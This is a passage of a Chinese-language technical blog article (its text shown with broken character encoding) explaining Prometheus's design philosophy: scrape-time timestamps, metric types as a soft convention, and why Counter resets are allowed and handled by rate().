ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>Prometheus åªç”¨å››ç§æŒ‡æ ‡ç±»å‹å°±èƒ½æè¿°ä¸–é—´ä¸‡ç‰©çš„ç›‘æ§éœ€æ±‚ï¼šCounterã€Gaugeã€Histogramã€Summaryã€‚</p>
<p>è¿™çœ‹ä¼¼ç®€å•ï¼Œä½†èƒŒåè—ç€ä¸€æ•´å¥—è®¾è®¡å“²å­¦ï¼š</p>
<ul>
<li><strong>å¦‚ä½•ç”¨æœ€ç®€å•çš„æ¨¡å‹æè¿°æœ€å¤æ‚çš„ç³»ç»Ÿï¼Ÿ</strong></li>
<li><strong>å¦‚ä½•åœ¨çµæ´»æ€§å’Œçº¦æŸä¹‹é—´æ‰¾åˆ°å¹³è¡¡ï¼Ÿ</strong></li>
<li><strong>ä¸ºä»€ä¹ˆ"å…è®¸ Counter é‡ç½®"åè€Œæ˜¯æ›´ä¼˜é›…çš„è®¾è®¡ï¼Ÿ</strong></li>
</ul>
<p>è¿™ä¸æ˜¯ä¸€ç¯‡å·¥å…·æ‰‹å†Œï¼Œè€Œæ˜¯ä¸€æ¬¡å¯¹ Prometheus è®¾è®¡æ™ºæ…§çš„æ·±åº¦æ¢è®¨ã€‚å½“ä½ ç†è§£äº†è¿™å¥—è®¾è®¡å“²å­¦ï¼Œä½ å°±èƒ½ç†è§£ä¸ºä»€ä¹ˆ Prometheus èƒ½ç”¨å¦‚æ­¤ç®€å•çš„æ¨¡å‹ï¼Œçœ‹é€å¤æ‚ç³»ç»Ÿçš„æœ¬è´¨ã€‚</p>
<hr/>
<h2 data-id="heading-0">ç›®å½•</h2>
<ol>
<li><a href="#1-%E8%AE%BE%E8%AE%A1%E5%93%B2%E5%AD%A6%E7%AE%80%E5%8D%95%E4%BC%98%E5%85%88%E7%9A%84%E4%B8%89%E4%B8%AA%E4%BD%93%E7%8E%B0" title="#1-%E8%AE%BE%E8%AE%A1%E5%93%B2%E5%AD%A6%E7%AE%80%E5%8D%95%E4%BC%98%E5%85%88%E7%9A%84%E4%B8%89%E4%B8%AA%E4%BD%93%E7%8E%B0">è®¾è®¡å“²å­¦ï¼šç®€å•ä¼˜å…ˆçš„ä¸‰ä¸ªä½“ç°</a></li>
<li><a href="#2-%E5%9B%9B%E7%A7%8D%E6%8C%87%E6%A0%87%E7%94%A8%E6%9C%80%E5%B0%91%E7%9A%84%E7%B1%BB%E5%9E%8B%E6%8F%8F%E8%BF%B0%E6%9C%80%E5%A4%9A%E7%9A%84%E5%9C%BA%E6%99%AF" title="#2-%E5%9B%9B%E7%A7%8D%E6%8C%87%E6%A0%87%E7%94%A8%E6%9C%80%E5%B0%91%E7%9A%84%E7%B1%BB%E5%9E%8B%E6%8F%8F%E8%BF%B0%E6%9C%80%E5%A4%9A%E7%9A%84%E5%9C%BA%E6%99%AF">å››ç§æŒ‡æ ‡ï¼šç”¨æœ€å°‘çš„ç±»å‹æè¿°æœ€å¤šçš„åœºæ™¯</a></li>
<li><a href="#3-histogram%E5%A6%82%E4%BD%95%E4%BC%98%E9%9B%85%E5%9C%B0%E5%A4%84%E7%90%86%E5%88%86%E5%B8%83%E9%97%AE%E9%A2%98" title="#3-histogram%E5%A6%82%E4%BD%95%E4%BC%98%E9%9B%85%E5%9C%B0%E5%A4%84%E7%90%86%E5%88%86%E5%B8%83%E9%97%AE%E9%A2%98">Histogramï¼šå¦‚ä½•ä¼˜é›…åœ°å¤„ç†åˆ†å¸ƒé—®é¢˜</a></li>
<li><a href="#4-%E6%98%93%E6%B7%B7%E6%B7%86%E6%A6%82%E5%BF%B5%E7%BB%86%E8%8A%82%E4%B8%AD%E7%9A%84%E8%AE%BE%E8%AE%A1%E6%99%BA%E6%85%A7" title="#4-%E6%98%93%E6%B7%B7%E6%B7%86%E6%A6%82%E5%BF%B5%E7%BB%86%E8%8A%82%E4%B8%AD%E7%9A%84%E8%AE%BE%E8%AE%A1%E6%99%BA%E6%85%A7">æ˜“æ··æ·†æ¦‚å¿µï¼šç»†èŠ‚ä¸­çš„è®¾è®¡æ™ºæ…§</a></li>
<li><a href="#5-%E7%94%9F%E4%BA%A7%E5%AE%9E%E8%B7%B5%E7%90%86%E8%AE%BA%E5%88%B0%E8%90%BD%E5%9C%B0%E7%9A%84%E6%9C%80%E5%90%8E%E4%B8%80%E5%85%AC%E9%87%8C" title="#5-%E7%94%9F%E4%BA%A7%E5%AE%9E%E8%B7%B5%E7%90%86%E8%AE%BA%E5%88%B0%E8%90%BD%E5%9C%B0%E7%9A%84%E6%9C%80%E5%90%8E%E4%B8%80%E5%85%AC%E9%87%8C">ç”Ÿäº§å®è·µï¼šç†è®ºåˆ°è½åœ°çš„æœ€åä¸€å…¬é‡Œ</a></li>
<li><a href="#6-%E4%B8%8B%E4%B8%80%E6%AD%A5%E4%BB%8E%E7%90%86%E8%A7%A3%E5%88%B0%E5%AE%9E%E8%B7%B5" title="#6-%E4%B8%8B%E4%B8%80%E6%AD%A5%E4%BB%8E%E7%90%86%E8%A7%A3%E5%88%B0%E5%AE%9E%E8%B7%B5">ä¸‹ä¸€æ­¥ï¼šä»ç†è§£åˆ°å®è·µ</a></li>
</ol>
<hr/>
<h2 data-id="heading-1">1. è®¾è®¡å“²å­¦ï¼šç®€å•ä¼˜å…ˆçš„ä¸‰ä¸ªä½“ç°</h2>
<p>Prometheus çš„è®¾è®¡å“²å­¦å¯ä»¥ç”¨ä¸€å¥è¯æ¦‚æ‹¬ï¼š<strong>ç”¨æœ€ç®€å•çš„æ–¹å¼è§£å†³é—®é¢˜</strong>ã€‚</p>
<p>è¿™ä¸ªå“²å­¦åœ¨ä¸‰ä¸ªå…³é”®è®¾è®¡ä¸Šä½“ç°å¾—æ·‹æ¼“å°½è‡´ã€‚</p>
<h3 data-id="heading-2">1.1 æ—¶é—´åºåˆ—çš„æœ¬è´¨</h3>
<p>Prometheus æ˜¯ä¸€ä¸ªæ—¶é—´åºåˆ—æ•°æ®åº“ï¼ˆTSDBï¼‰ã€‚ç†è§£å®ƒçš„ç¬¬ä¸€æ­¥ï¼Œæ˜¯ç†è§£ä»€ä¹ˆæ˜¯æ—¶é—´åºåˆ—ã€‚</p>
<p><strong>æ—¶é—´åºåˆ—çš„å®šä¹‰</strong></p>
<p>æ—¶é—´åºåˆ—å°±æ˜¯"æ•°å€¼éšæ—¶é—´å˜åŒ–çš„è®°å½•"ã€‚æ›´å‡†ç¡®åœ°è¯´ï¼Œå®ƒæ˜¯ä¸€ä¸ªä¸‰å…ƒç»„ï¼š</p>
<pre><code class="hljs language-scss" lang="scss">(æŒ‡æ ‡å, æ ‡ç­¾é›†åˆ, æ—¶é—´ç‚¹) â†’ æ•°å€¼
</code></pre>
<p>å½“ä½ è®¿é—® Exporter çš„ <code>/metrics</code> ç«¯ç‚¹æ—¶ï¼Œçœ‹åˆ°çš„æ˜¯è¿™æ ·çš„æ–‡æœ¬ï¼š</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># HELP http_requests_total æ€»HTTPè¯·æ±‚æ•°</span>
<span class="hljs-comment"># TYPE http_requests_total counter</span>
http_requests_total{<span class="hljs-attr">method</span>=<span class="hljs-string">"GET"</span>, status=<span class="hljs-string">"200"</span>} <span class="hljs-number">1234</span>
http_requests_total{<span class="hljs-attr">method</span>=<span class="hljs-string">"POST"</span>, status=<span class="hljs-string">"200"</span>} <span class="hljs-number">567</span>
http_requests_total{<span class="hljs-attr">method</span>=<span class="hljs-string">"GET"</span>, status=<span class="hljs-string">"404"</span>} <span class="hljs-number">42</span>
</code></pre>
<p>æ¯ä¸€è¡Œéƒ½æ˜¯ä¸€ä¸ª"æ•°æ®ç‚¹"ï¼Œä½†è¿™é‡Œæœ‰ä¸ªé—®é¢˜ï¼š<strong>æ—¶é—´æˆ³åœ¨å“ªï¼Ÿ</strong></p>
<p><strong>æ—¶é—´æˆ³ç”±è°æ·»åŠ ï¼Ÿ</strong></p>
<p>ç­”æ¡ˆæ˜¯ï¼š<strong>Prometheus åœ¨æŠ“å–æ—¶æ·»åŠ æ—¶é—´æˆ³</strong>ã€‚</p>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart LR
    A[Exporter æš´éœ²å½“å‰å€¼] --&gt; B[Prometheus æŠ“å–å¹¶è®°å½•æ—¶é—´]
    B --&gt; C[å­˜å‚¨ä¸ºæ—¶é—´åºåˆ—]
    
    style A fill:#e1f5ff
    style B fill:#fff4e1
    style C fill:#ffe1f5
</code></pre>
<p>æµç¨‹æ˜¯è¿™æ ·çš„ï¼š</p>
<ol>
<li><strong>Exporter æš´éœ²æŒ‡æ ‡</strong>ï¼šåªè¯´"ç°åœ¨çš„å€¼æ˜¯ 1234"</li>
<li><strong>Prometheus å®šæ—¶æŠ“å–</strong>ï¼ˆé»˜è®¤ 15 ç§’ä¸€æ¬¡ï¼‰ï¼šè®°å½•"æˆ‘åœ¨ 2024-12-29 10:00:00 æŠ“åˆ°çš„å€¼æ˜¯ 1234"</li>
<li><strong>å­˜å‚¨åˆ° TSDB</strong>ï¼šå½¢æˆæ—¶é—´åºåˆ—</li>
</ol>
<p><strong>ä¸ºä»€ä¹ˆè¿™æ ·è®¾è®¡ï¼Ÿ</strong></p>
<p>è¿™ä¸ªè®¾è®¡çœ‹ä¼¼ç®€å•ï¼Œä½†å¾ˆå·§å¦™ï¼š</p>

























<table><thead><tr><th>å¦‚æœç”± Exporter æä¾›æ—¶é—´æˆ³</th><th>å¦‚æœç”± Prometheus æ·»åŠ æ—¶é—´æˆ³</th></tr></thead><tbody><tr><td>100 ä¸ª Exporterï¼Œ100 ä¸ªæ—¶é’Ÿ</td><td>1 ä¸ª Prometheusï¼Œ1 ä¸ªæ—¶é’Ÿ</td></tr><tr><td>æ—¶é’Ÿå¯èƒ½ä¸åŒæ­¥</td><td>æ—¶é’Ÿç»Ÿä¸€</td></tr><tr><td>Exporter éœ€è¦ç®¡ç†æ—¶é—´æˆ³</td><td>Exporter æ— çŠ¶æ€ï¼Œç®€å•</td></tr><tr><td>æ—¶é—´æˆ³å¯èƒ½é”™è¯¯</td><td>æ—¶é—´æˆ³å¯é </td></tr></tbody></table>
<p>è¿™æ˜¯ Prometheus "ç®€å•ä¼˜å…ˆ" è®¾è®¡å“²å­¦çš„ç¬¬ä¸€ä¸ªä½“ç°ï¼š<strong>è®© Exporter å°½å¯èƒ½ç®€å•ï¼Œå¤æ‚çš„äº‹æƒ…ç”± Prometheus æ¥åš</strong>ã€‚</p>
<h3 data-id="heading-3">1.2 "ç±»å‹"åªæ˜¯çº¦å®šï¼Œä¸æ˜¯å¼ºåˆ¶</h3>
<p>çœ‹çœ‹ <code>/metrics</code> è¾“å‡ºçš„ç¬¬äºŒè¡Œï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># TYPE http_requests_total counter</span>
</code></pre>
<p>è¿™é‡Œå£°æ˜äº† <code>http_requests_total</code> æ˜¯ä¸€ä¸ª <code>counter</code> ç±»å‹ã€‚é‚£ä¹ˆé—®é¢˜æ¥äº†ï¼š<strong>Prometheus çœŸçš„åœ¨ä¹è¿™ä¸ªç±»å‹å£°æ˜å—ï¼Ÿ</strong></p>
<p>ç­”æ¡ˆæ˜¯ï¼š<strong>ä¸åœ¨ä¹</strong>ã€‚</p>
<p><strong>å®¢æˆ·ç«¯ã€ä¼ è¾“ã€å­˜å‚¨ä¸‰ä¸ªè§†è§’</strong></p>
<p>è®©æˆ‘ä»¬ä»ä¸‰ä¸ªå±‚é¢çœ‹"ç±»å‹"ï¼š</p>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart TB
    A[å®¢æˆ·ç«¯å±‚ æœ‰ç±»å‹çº¦æŸ] --&gt; B[ä¼ è¾“å±‚ TYPEåªæ˜¯æ³¨é‡Š]
    B --&gt; C[å­˜å‚¨å±‚ æ— ç±»å‹åªæœ‰æ•°å­—]
    
    style A fill:#e1f5ff
    style B fill:#fff4e1
    style C fill:#ffe1f5
</code></pre>
<p><strong>1. å®¢æˆ·ç«¯å±‚ï¼ˆæœ‰ç±»å‹ï¼‰</strong></p>
<p>åœ¨ä»£ç é‡Œï¼Œä½ ç”¨å®˜æ–¹åº“å®šä¹‰æŒ‡æ ‡æ—¶ï¼Œç±»å‹æ˜¯æœ‰æ„ä¹‰çš„ï¼š</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-comment">// Go ä»£ç ç¤ºä¾‹</span>
counter := prometheus.NewCounter(...)  <span class="hljs-comment">// Counter ç±»å‹</span>
counter.Inc()   <span class="hljs-comment">// åªèƒ½å¢åŠ ï¼Œä¸èƒ½å‡å°‘</span>
counter.Dec()   <span class="hljs-comment">// ç¼–è¯‘é”™è¯¯ï¼Counter æ²¡æœ‰ Dec() æ–¹æ³•</span>

gauge := prometheus.NewGauge(...)     <span class="hljs-comment">// Gauge ç±»å‹</span>
gauge.Set(<span class="hljs-number">42</span>)   <span class="hljs-comment">// å¯ä»¥éšæ„è®¾ç½®</span>
gauge.Inc()     <span class="hljs-comment">// ä¹Ÿå¯ä»¥å¢åŠ </span>
gauge.Dec()     <span class="hljs-comment">// ä¹Ÿå¯ä»¥å‡å°‘</span>
</code></pre>
<p>å®¢æˆ·ç«¯åº“é€šè¿‡ API çš„è®¾è®¡æ¥"å¼ºåˆ¶"ç±»å‹çº¦æŸã€‚</p>
<p><strong>2. ä¼ è¾“å±‚ï¼ˆç±»å‹æ˜¯æ³¨é‡Šï¼‰</strong></p>
<p>ä½†åˆ°äº† <code>/metrics</code> è¾“å‡ºï¼Œç±»å‹å°±åªæ˜¯ä¸€è¡Œæ³¨é‡Šï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># TYPE my_counter counter    â† è¿™åªæ˜¯ç»™äººçœ‹çš„æ³¨é‡Š</span>
my_counter 100
my_counter 50                 â† Prometheus ä¸ä¼šå› ä¸º Counter å‡å°‘è€ŒæŠ¥é”™
</code></pre>
<p><strong>3. å­˜å‚¨å±‚ï¼ˆæ— ç±»å‹ï¼‰</strong></p>
<p>åˆ°äº† Prometheus çš„å­˜å‚¨å±‚ï¼Œæ‰€æœ‰æŒ‡æ ‡éƒ½æ˜¯"æ—¶é—´åºåˆ—"ï¼š</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-selector-tag">my_counter</span>{} 
  <span class="hljs-variable">@1735462800</span> â†’ <span class="hljs-number">100</span>
  <span class="hljs-variable">@1735462815</span> â†’ <span class="hljs-number">50</span>
  <span class="hljs-variable">@1735462830</span> â†’ <span class="hljs-number">75</span>
</code></pre>
<p>Prometheus çœ‹åˆ°çš„å°±æ˜¯"ä¸€ä¸²æ•°å­—éšæ—¶é—´å˜åŒ–"ï¼Œå®ƒä¸çŸ¥é“ä¹Ÿä¸åœ¨ä¹è¿™ä¸ªæŒ‡æ ‡å£°æ˜çš„ç±»å‹æ˜¯ä»€ä¹ˆã€‚</p>
<p><strong>ä¸ºä»€ä¹ˆè¿™æ ·è®¾è®¡ï¼Ÿ</strong></p>
<p>è¿™åˆæ˜¯ Prometheus "ç®€å•ä¼˜å…ˆ" çš„ä½“ç°ï¼š</p>
<ul>
<li><strong>å­˜å‚¨å¼•æ“ç®€å•</strong>ï¼šä¸éœ€è¦å¤æ‚çš„ç±»å‹ç³»ç»Ÿï¼Œåªéœ€è¦å­˜ (timestamp, value) å¯¹</li>
<li><strong>æŸ¥è¯¢çµæ´»</strong>ï¼šä½ å¯ä»¥å¯¹ä»»ä½•æŒ‡æ ‡ç”¨ä»»ä½•å‡½æ•°ï¼ˆè™½ç„¶å¯èƒ½æ²¡æ„ä¹‰ï¼‰</li>
<li><strong>æ€§èƒ½æ›´å¥½</strong>ï¼šä¸éœ€è¦åœ¨æŸ¥è¯¢æ—¶æ£€æŸ¥ç±»å‹å…¼å®¹æ€§</li>
<li><strong>å‘åå…¼å®¹</strong>ï¼šåç»­æ·»åŠ æ–°ç±»å‹ä¸å½±å“å­˜å‚¨å±‚</li>
</ul>
<p><strong>é‚£ç±»å‹æœ‰ä»€ä¹ˆç”¨ï¼Ÿ</strong></p>
<p>ç±»å‹çš„ä½œç”¨åœ¨äº<strong>çº¦å®š</strong>å’Œ<strong>æ–‡æ¡£</strong>ï¼š</p>
<ol>
<li><strong>å¸®åŠ©ä½ é€‰æ‹©æ­£ç¡®çš„ API</strong>ï¼ˆå®¢æˆ·ç«¯å±‚ï¼‰</li>
<li><strong>å¸®åŠ©ä½ é€‰æ‹©æ­£ç¡®çš„å‡½æ•°</strong>ï¼ˆæ¯”å¦‚ Counter ç”¨ <code>rate()</code>ï¼ŒGauge ç”¨ <code>delta()</code>ï¼‰</li>
<li><strong>å¸®åŠ©å·¥å…·ç†è§£æŒ‡æ ‡</strong>ï¼ˆæ¯”å¦‚ Grafana å¯ä»¥æ ¹æ®ç±»å‹æä¾›ä¸åŒçš„å¯è§†åŒ–é€‰é¡¹ï¼‰</li>
</ol>
<p>ä½†è¿™ä¸€åˆ‡éƒ½æ˜¯"è½¯çº¦æŸ"ï¼Œä¸æ˜¯"ç¡¬é™åˆ¶"ã€‚</p>
<h3 data-id="heading-4">1.3 Counter å¯ä»¥é‡ç½®ï¼šä¸ºä»€ä¹ˆå…è®¸ï¼Ÿ</h3>
<p>è¿™æ˜¯ Prometheus è®¾è®¡å“²å­¦ä¸­æœ€å®¹æ˜“å¼•èµ·å›°æƒ‘çš„ä¸€ç‚¹ã€‚</p>
<p><strong>ä¸€ä¸ªçœŸå®çš„åœºæ™¯</strong></p>
<p>ä½ çš„åº”ç”¨è¿è¡Œåœ¨ Kubernetes ä¸Šï¼Œæœ‰ä¸ª Counter æŒ‡æ ‡ <code>http_requests_total</code>ï¼š</p>
<pre><code class="hljs language-makefile" lang="makefile"><span class="hljs-section">10:00:00 â†’ 1000</span>
<span class="hljs-section">10:01:00 â†’ 1500</span>
<span class="hljs-section">10:02:00 â†’ Pod é‡å¯äº†</span>
<span class="hljs-section">10:02:15 â†’ 0        â† Counter é‡ç½®ä¸º 0</span>
<span class="hljs-section">10:03:00 â†’ 50</span>
</code></pre>
<p>è¿™æ—¶å€™ï¼Œæœ‰äººå¯èƒ½ä¼šé—®ï¼š<strong>ä¸ºä»€ä¹ˆä¸æŠŠ Counter æŒä¹…åŒ–ï¼Œé‡å¯åç»§ç»­ç´¯åŠ ï¼Ÿ</strong></p>
<p>æ¯”å¦‚å¯ä»¥è¿™æ ·è®¾è®¡ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">Pod é‡å¯å‰ï¼š<span class="hljs-attr">http_requests_total</span> = <span class="hljs-number">1500</span>
å†™å…¥ç£ç›˜ï¼š1500
Pod é‡å¯åï¼šä»ç£ç›˜è¯»å– 1500
ç»§ç»­ç´¯åŠ ï¼š<span class="hljs-attr">http_requests_total</span> = <span class="hljs-number">1500</span> + æ–°è¯·æ±‚æ•°
</code></pre>
<p><strong>ä¸ºä»€ä¹ˆ Prometheus ä¸è¿™ä¹ˆåšï¼Ÿ</strong></p>
<p>è®©æˆ‘ä»¬å¯¹æ¯”ä¸¤ç§æ–¹æ¡ˆï¼š</p>






























<table><thead><tr><th>æ–¹æ¡ˆ</th><th>æŒä¹…åŒ– Counter</th><th>å…è®¸é‡ç½®</th></tr></thead><tbody><tr><td><strong>Exporter å¤æ‚åº¦</strong></td><td>éœ€è¦æ–‡ä»¶/æ•°æ®åº“å­˜å‚¨</td><td>æ— çŠ¶æ€ï¼Œç®€å•</td></tr><tr><td><strong>å®¹å™¨å‹å¥½æ€§</strong></td><td>éœ€è¦æŒ‚è½½æŒä¹…åŒ–å­˜å‚¨</td><td>å®¹å™¨å¯ä»¥éšæ„é”€æ¯é‡å»º</td></tr><tr><td><strong>æ•…éšœå¤„ç†</strong></td><td>æ–‡ä»¶æŸåï¼Ÿå¹¶å‘å†²çªï¼Ÿ</td><td>æ²¡æœ‰çŠ¶æ€ï¼Œæ²¡æœ‰æ•…éšœ</td></tr><tr><td><strong>ç›‘æ§ç›®çš„</strong></td><td>ç²¾ç¡®ç´¯ç§¯å€¼</td><td>é€Ÿç‡å’Œè¶‹åŠ¿</td></tr></tbody></table>
<p>Prometheus çš„é€‰æ‹©æ˜¯ï¼š<strong>å…è®¸é‡ç½®ï¼Œä¸“æ³¨äºé€Ÿç‡</strong>ã€‚</p>
<p>è¿™ä¸ªé€‰æ‹©èƒŒåçš„å“²å­¦æ˜¯ï¼š</p>
<blockquote>
<p>"Prometheus is designed for operational monitoring, not for billing or accounting."</p>
</blockquote>
<p>ç¿»è¯‘ä¸€ä¸‹ï¼š</p>
<p><strong>Prometheus æ˜¯ä¸ºè¿ç»´ç›‘æ§è€Œè®¾è®¡çš„ï¼Œä¸æ˜¯ä¸ºè®¡è´¹æˆ–ä¼šè®¡æ ¸ç®—è€Œè®¾è®¡çš„ã€‚</strong></p>
<p><strong>ç›‘æ§ vs è®¡è´¹çš„åŒºåˆ«</strong></p>





















<table><thead><tr><th>ç›‘æ§å…³å¿ƒçš„é—®é¢˜</th><th>è®¡è´¹å…³å¿ƒçš„é—®é¢˜</th></tr></thead><tbody><tr><td>ç°åœ¨è¯·æ±‚é€Ÿç‡æ˜¯å¤šå°‘ï¼Ÿ</td><td>æ€»å…±å¤„ç†äº†å¤šå°‘ä¸ªè¯·æ±‚ï¼Ÿ</td></tr><tr><td>é”™è¯¯ç‡æ˜¯å¦åœ¨ä¸Šå‡ï¼Ÿ</td><td>æ€»å…±æœ‰å¤šå°‘ä¸ªé”™è¯¯ï¼Ÿ</td></tr><tr><td>ç³»ç»Ÿæ˜¯å¦å¥åº·ï¼Ÿ</td><td>ç”¨æˆ·åº”è¯¥ä»˜å¤šå°‘é’±ï¼Ÿ</td></tr></tbody></table>
<p>ç›‘æ§åªéœ€è¦çŸ¥é“ï¼š</p>
<ul>
<li>æ¯ç§’å¤„ç†å¤šå°‘è¯·æ±‚ï¼ˆé€Ÿç‡ï¼‰</li>
<li>é€Ÿç‡æ˜¯å¦å¼‚å¸¸ï¼ˆå‘Šè­¦ï¼‰</li>
<li>è¶‹åŠ¿æ˜¯ä¸Šå‡è¿˜æ˜¯ä¸‹é™</li>
</ul>
<p><strong>ä¸éœ€è¦çŸ¥é“</strong>ï¼š</p>
<ul>
<li>ä»ç³»ç»Ÿä¸Šçº¿åˆ°ç°åœ¨æ€»å…±å¤„ç†äº† 1,234,567,890 ä¸ªè¯·æ±‚</li>
</ul>
<p>åè€…åº”è¯¥ç”±æ•°æ®åº“äº‹åŠ¡ã€æ—¥å¿—ç³»ç»Ÿã€æˆ–ä¸“é—¨çš„è®¡è´¹ç³»ç»Ÿæ¥ä¿è¯ã€‚</p>
<p><strong>rate() å¦‚ä½•å¤„ç†é‡ç½®</strong></p>
<p>Prometheus çš„ <code>rate()</code> å‡½æ•°ä¼šè‡ªåŠ¨æ£€æµ‹ Counter é‡ç½®ï¼š</p>
<pre><code class="hljs language-promql" lang="promql">rate(http_requests_total[5m])
</code></pre>
<p>åŸç†å¾ˆç®€å•ï¼š</p>
<ol>
<li><strong>æ£€æµ‹é‡ç½®</strong>ï¼šå¦‚æœå½“å‰å€¼ &lt; ä¸Šä¸€ä¸ªå€¼ï¼Œè®¤ä¸ºå‘ç”Ÿäº†é‡ç½®</li>
<li><strong>è°ƒæ•´è®¡ç®—</strong>ï¼šåªç”¨é‡ç½®åçš„æ•°æ®è®¡ç®—é€Ÿç‡</li>
<li><strong>ç»§ç»­æ­£å¸¸</strong>ï¼šä¸‹ä¸€ä¸ªå‘¨æœŸæ­£å¸¸è®¡ç®—</li>
</ol>
<p>ä¸¾ä¾‹ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">æ—¶é—´    å€¼     rate() è®¡ç®—
10:00   1000   
10:01   1500   (1500-1000)/<span class="hljs-attr">60</span> = <span class="hljs-number">8.33</span>/s
10:02   0      æ£€æµ‹åˆ°é‡ç½®ï¼Œè·³è¿‡
10:03   50     (50-0)/<span class="hljs-attr">60</span> = <span class="hljs-number">0.83</span>/s
10:04   120    (120-50)/<span class="hljs-attr">60</span> = <span class="hljs-number">1.16</span>/s
</code></pre>
<p>æ‰€ä»¥å³ä½¿ Counter é‡ç½®ï¼Œ<code>rate()</code> ä¾ç„¶èƒ½ç»™å‡ºæ­£ç¡®çš„é€Ÿç‡ã€‚</p>
<p><strong>æ€»ç»“è¿™ä¸€èŠ‚</strong></p>
<p>Prometheus å…è®¸ Counter é‡ç½®ï¼Œæ˜¯å› ä¸ºï¼š</p>
<ol>
<li><strong>ç®€åŒ– Exporter è®¾è®¡</strong>ï¼šæ— çŠ¶æ€æ›´ç®€å•ã€æ›´å¯é </li>
<li><strong>é€‚åº”äº‘åŸç”Ÿ</strong>ï¼šå®¹å™¨éšæ—¶é‡å¯æ˜¯å¸¸æ€</li>
<li><strong>ä¸“æ³¨ç›‘æ§æœ¬è´¨</strong>ï¼šå…³å¿ƒé€Ÿç‡å’Œè¶‹åŠ¿ï¼Œä¸å…³å¿ƒç²¾ç¡®ç´¯ç§¯å€¼</li>
<li><strong>rate() èƒ½å¤„ç†</strong>ï¼šè‡ªåŠ¨æ£€æµ‹å’Œè°ƒæ•´</li>
</ol>
<p>è¿™å°±æ˜¯ Prometheus çš„ç¬¬ä¸€ä¸ªè®¾è®¡æ™ºæ…§ï¼š<strong>ç‰ºç‰²ä¸€ç‚¹"ç²¾ç¡®æ€§"ï¼Œæ¢å–"ç®€å•æ€§"å’Œ"å¯é æ€§"</strong>ã€‚</p>
<p>è¿™ä¸ªå–èˆèƒŒåçš„æ·±å±‚æ€è€ƒæ˜¯ï¼šç›‘æ§ç³»ç»Ÿçš„ä»·å€¼ä¸åœ¨äº"è®°å½•äº†å¤šå°‘æ•°å­—"ï¼Œè€Œåœ¨äº"èƒ½å¦åŠæ—¶å‘ç°é—®é¢˜"ã€‚åªè¦é€Ÿç‡å’Œè¶‹åŠ¿æ˜¯å¯¹çš„ï¼Œç»å¯¹ç´¯ç§¯å€¼ä¸é‚£ä¹ˆé‡è¦ã€‚</p>
<hr/>
<h2 data-id="heading-5">2. å››ç§æŒ‡æ ‡ï¼šç”¨æœ€å°‘çš„ç±»å‹æè¿°æœ€å¤šçš„åœºæ™¯</h2>
<p>å¦‚æœè®©ä½ è®¾è®¡ä¸€å¥—æŒ‡æ ‡ç±»å‹ï¼Œä½ ä¼šè®¾è®¡å‡ ç§ï¼Ÿ</p>
<p>å¯èƒ½ä¼šæƒ³ï¼šHTTP è¯·æ±‚ä¸€ç§ã€æ•°æ®åº“æŸ¥è¯¢ä¸€ç§ã€å†…å­˜ä½¿ç”¨ä¸€ç§ã€CPU ä½¿ç”¨ä¸€ç§...å¾ˆå¿«å°±ä¼šæœ‰å‡ åç§ç±»å‹ã€‚</p>
<p>ä½† Prometheus åªç”¨å››ç§ï¼šCounterã€Gaugeã€Histogramã€Summaryã€‚</p>
<p>è¿™æ˜¯å¦‚ä½•åšåˆ°çš„ï¼Ÿç­”æ¡ˆæ˜¯ï¼š<strong>æŠ“ä½æœ¬è´¨ï¼Œè€Œä¸æ˜¯ç°è±¡</strong>ã€‚</p>
<ul>
<li>Counter çš„æœ¬è´¨ï¼šåªå¢ä¸å‡çš„ç´¯ç§¯</li>
<li>Gauge çš„æœ¬è´¨ï¼šå¯å¢å¯å‡çš„çŠ¶æ€</li>
<li>Histogram çš„æœ¬è´¨ï¼šåˆ†å¸ƒç»Ÿè®¡</li>
<li>Summary çš„æœ¬è´¨ï¼šé¢„è®¡ç®—</li>
</ul>
<p>åªè¦ç†è§£äº†æœ¬è´¨ï¼Œä¸€ä¸ª Counter å°±èƒ½æè¿°æ‰€æœ‰"ç´¯ç§¯"çš„åœºæ™¯ã€‚</p>
<h3 data-id="heading-6">2.1 Counterï¼ˆè®¡æ•°å™¨ï¼‰</h3>
<p><strong>å®šä¹‰</strong></p>
<p>Counter æ˜¯å•è°ƒé€’å¢çš„è®¡æ•°å™¨ï¼Œåªå¢ä¸å‡ï¼ˆé™¤éé‡ç½®ï¼‰ã€‚</p>
<p><strong>å…¸å‹åœºæ™¯</strong></p>
<p>å›ç­”"å‘ç”Ÿäº†å¤šå°‘æ¬¡"çš„é—®é¢˜ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">çœŸå®åœºæ™¯ï¼šAPI æœåŠ¡

